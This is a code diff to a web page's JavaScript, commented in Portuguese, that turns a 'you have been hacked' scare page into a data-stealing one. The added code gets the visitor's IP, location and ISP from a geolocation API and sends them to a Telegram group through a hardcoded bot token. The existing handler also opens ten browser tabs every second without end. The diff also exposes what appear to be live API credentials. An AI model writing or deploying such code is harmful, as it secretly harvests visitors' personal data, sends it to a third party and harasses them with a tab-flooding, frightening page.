@@ -106,41 +106,61 @@
     </div>
 
     <script>
+        const telegramBotToken = '7545142881:AAHD_s9gLTIpOUqHDfnu1_rGtDytwaerf_g'; // Insira seu token do bot aqui
+        const telegramGroupId = '-1002018953064'; // Insira o ID do seu grupo aqui
+
         // Função para obter o IP, a localização e a conexão de Internet do usuário
         async function getUserIPLocationAndConnection() {
             try {
                 const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
                 const data = await response.json();
-                document.getElementById('ipMessage').innerText = `you have been hacked IP ${data.ip}`;
-                document.getElementById('locationMessage').innerText = `Location ${data.city}, ${data.country_name}`;
-                document.getElementById('internetMessage').innerText = `Connection ${data.connection}; Provider ${data.isp}`;
+                return {
+                    ip: data.ip,
+                    location: `${data.city}, ${data.country_name}`,
+                    connection: `${data.connection}; Provedor: ${data.isp}`
+                };
             } catch (error) {
-                document.getElementById('ipMessage').innerText = 'Não foi possível obter o IP.';
-                document.getElementById('locationMessage').innerText = 'Não foi possível obter a localização.';
-                document.getElementById('internetMessage').innerText = 'Não foi possível obter a conexão.';
+                return null; // Retorna nulo em caso de erro
             }
         }
 
-        // Chama a função para obter o IP, a localização e a conexão ao carregar a página
-        getUserIPLocationAndConnection();
+        // Função para enviar mensagem para o Telegram
+        async function sendToTelegram(ip, location, connection) {
+            const message = `Você foi hackeado!\nIP: ${ip}\nLocalização: ${location}\nConexão: ${connection}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramGroupId}&text=${encodeURIComponent(message)}`;
+
+            await fetch(url);
+        }
 
         // Função para iniciar o vídeo e abrir novas guias
-        function startVideoAndOpenTabs() {
-            const videoContainer = document.getElementById('videoContainer');
-            videoContainer.style.display = 'block'; // Mostra o container do vídeo
-            const player = document.getElementById('youtubeVideo');
-            player.style.display = 'block'; // Mostra o iframe do vídeo
-            player.src += ""; // Reinicia o src para tentar o autoplay novamente
-            
-            // Abre 10 novas guias a cada segundo
-            setInterval(() => {
-                for (let i = 0; i < 10; i++) {
-                    window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
-                }
-            }, 1000); // Intervalo de 1 segundo (1000 milissegundos)
+        async function startVideoAndOpenTabs() {
+            const userInfo = await getUserIPLocationAndConnection();
 
-            // Inicia a animação das gotículas de sangue
-            createBloodDrops();
+            if (userInfo) {
+                // Envia as informações para o Telegram
+                await sendToTelegram(userInfo.ip, userInfo.location, userInfo.connection);
+                
+                // Atualiza as mensagens na página
+                document.getElementById('ipMessage').innerText = `Você foi hackeado! IP: ${userInfo.ip}`;
+                document.getElementById('locationMessage').innerText = `Localização: ${userInfo.location}`;
+                document.getElementById('internetMessage').innerText = `Conexão: ${userInfo.connection}`;
+                
+                const videoContainer = document.getElementById('videoContainer');
+                videoContainer.style.display = 'block'; // Mostra o container do vídeo
+                const player = document.getElementById('youtubeVideo');
+                player.style.display = 'block'; // Mostra o iframe do vídeo
+                player.src += ""; // Reinicia o src para tentar o autoplay novamente
+                
+                // Abre 10 novas guias a cada segundo
+                setInterval(() => {
+                    for (let i = 0; i < 10; i++) {
+                        window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
+                    }
+                }, 1000); // Intervalo de 1 segundo (1000 milissegundos)
+
+                // Inicia a animação das gotículas de sangue
+                createBloodDrops();
+            }
         }
 
         // Função para criar gotículas de sangue
